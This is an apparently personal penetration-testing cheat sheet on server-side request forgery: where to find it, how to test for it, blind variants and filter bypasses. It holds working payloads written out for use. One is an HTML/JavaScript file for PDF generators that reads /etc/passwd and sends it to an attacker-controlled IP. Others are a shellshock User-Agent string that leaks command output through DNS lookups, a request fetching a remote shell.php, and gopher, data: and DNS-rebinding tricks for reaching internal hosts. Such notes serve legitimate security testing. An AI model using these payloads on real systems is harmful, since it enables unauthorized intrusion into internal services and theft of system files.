# Content
- [What can SSRF vulnerabilities can lead to](#what-can-ssrf-vulnerabilities-can-lead-to)
- [Where to find SSRF](#where-to-find-ssrf-)
- [Testing if app vulnerable to SSRF](#testing-if-app-vulnerable-to-ssrf)
- [Blind SSRF](#blind-ssrf)
    - [blind SSRF via pdf generator](#blind-ssrf-via-pdf-generator)
    - [blind SSRF via User-Agent header](#blind-ssrf-via-user-agent-header-shellshock)
- [Bypass](#bypass)
    - [SSRF with blacklist-based input filters](#ssrf-with-blacklist-based-input-filters)
    - [SSRF with whitelist-based input filters](#ssrf-with-whitelist-based-input-filters)



## What can SSRF vulnerabilities can lead to:
- Interacting with known internal systems
- Discovering internal services via port scans
- Disclosing local/sensitive data
- Including files in the target application
- Leaking NetNTLM hashes using UNC Paths (Windows)
- Achieving remote code execution


## Where to find SSRF :
- Parts of HTTP requests, including (URLs,paramters,headrs,...)
     - Referer header
     - User-Agent header
```
Note: Always keep in mind that web application fuzzing should be part of any penetration testing or bug bounty hunting activity.
That being said, fuzzing should not be limited to user input fields only.
Extend fuzzing to parts of the HTTP request as well, such as the User-Agent.
```
- File imports such as HTML, PDFs, images, etc.
- Remote server connections to fetch data
- API specification imports
- Dashboards including ping and similar functionalities to check server statuses


## Testing if app vulnerable to SSRF
The most common test is local and remote file inclusion

- try diffrient protocols (http,file,ftp,..)
- fuzz ports
- do not forget to url encode if going through more than one app (ex:trible url encode)
- DNS loopkup for server you own
- Load External files (try RCE)
```
GET https://example.com/page?page=https://malicioussite.com/shell.php
```
- Access a Restricted Page
```
GET https://example.com/page?page=http://localhost/admin
```
- Attack other back-end systems
```
http://192.168.0.68/admin
```




## Blind SSRF
- We can detect blind SSRF vulnerabilities via out-of-band techniques
- Blind SSRF vulnerabilities could exist in PDF Document generators and HTTP Headers, among other locations.

### blind SSRF via pdf generator 
```
<html>
    <body>
        <b>Exfiltration via Blind SSRF</b>
        <script>
        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server
        readfile.open("GET","file:///etc/passwd", true); 
        readfile.send();
        readfile.onload = function() {
            if (readfile.readyState === 4) {
                var url = 'http://<SERVICE IP>:<PORT>/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
     </body>
</html>


```
### blind SSRF via User-Agent header (shellshock)
```
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

## Bypass

### SSRF with blacklist-based input filters

#### localhost obfuscation
```bash
Localhost Address Block: 127.0.0.0 - 127.255.255.255
Shortened IP Adress: 127.1
Prolonged IP Address: 127.000000000000000.1
All Zeroes: 0.0.0.0
Shortened All Zeroes: 0
Decimal Representation: 2130706433
Octal Representation: 0177.0000.0000.0001
Hex Representation: 0x7f000001
IPv6 loopback address: 0:0:0:0:0:0:0:1 (also ::1)
IPv4-mapped IPv6 loopback address: ::ffff:127.0.0.1


```
#### DNS resolution
```
1) Registering your own domain name that resolves to 127.0.0.1 OR any internal ip.
2) Nip.io allows simple wildcard DNS for any IP address (127.0.0.1.nip.io = 127.0.0.1 )
    - 127.0.0.1.nip.io  
    - 0x7f000001.nip.io (hexadecimal IP notation)
    - Something.google.com.127.0.0.1.nip.io
3) localtest.me == 127.0.0.1
4) lvh.me == 127.0.0.1
5) Registering your own domain name that resolves to 127.0.0.1 OR any internal ip.
```


#### Obfuscating blocked strings using URL encoding or case variation.
#### using different different protocols.
```
file:// (file read)
netdoc:// (file read)
dict://
gopher://
jar://
ldap://
ftp://
data:text/plain;base64,L2V0Yy9wYXNzd2Q=  (if the backend use the input to construct another url we can use data:// to include /etc/passwd directly)

You might be able to get file read.

Or send multi-line requests to gain additional impact

(Ex: gopher + redis = likely RCE)
```
#### HTTP redirects
```php
<?php header('Location: http://127.0.0.1/'); ?>
```
then host it
```bash
php -S 0.0.0.0:80
```

#### DNS Rebinding
- [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html)
![Screenshot_11](https://github.com/kiro6/penetration-testing-notes/assets/57776872/ff384973-5cfe-4690-8113-853869acea7a)

- running our domain on our own DNS server We can then conduct the DNS rebinding attack using a simple Python script such as [DNSrebinder](https://github.com/mogwailabs/DNSrebinder) or [FakeDns](https://github.com/Crypt0s/FakeDns)

```python
sudo python3 dnsrebinder.py --domain attacker.com --rebind 127.0.0.1 --ip 1.1.1.1 --counter 1 --tcp --udp
```

- Frequently, companies establish their own personalized internal DNS servers, alongside various administrative utilities like `Webmin`, `Pihole`, `PRTG Network Monitor`, and` Manageengine`. If these assets are compromised, we can exploit them to redirect DNS traffic towards our rogue DNS server.


change the dns server to our own
![Screenshot_12](https://github.com/kiro6/penetration-testing-notes/assets/57776872/5dea2a30-066e-40ab-8eed-0ca6abc641f5)

then run dnsrebinder
```
sudo python3 dnsrebinder.py --domain attacker.com --rebind 127.0.0.1 --ip 1.1.1.1 --counter 1 --tcp --udp

Starting nameserver...
UDP server loop running in thread: Thread-1
TCP server loop running in thread: Thread-2
```

### SSRF with whitelist-based input filters

- You can embed credentials in a URL before the hostname, using the @ character. For example:
```bash
https://expected-host:fakepassword@evil-host
```
- You can use the # character to indicate a URL fragment. For example:
```bash
https://evil-host#expected-host
```
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
```bash
https://expected-host.evil-host
```
- You can URL-encode characters to confuse the URL-parsing code This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
```text
Note
that you can also try double-encoding characters
some servers recursively URL-decode the input they receive, which can lead to further discrepancies.
```
- You can use combinations of these techniques together.

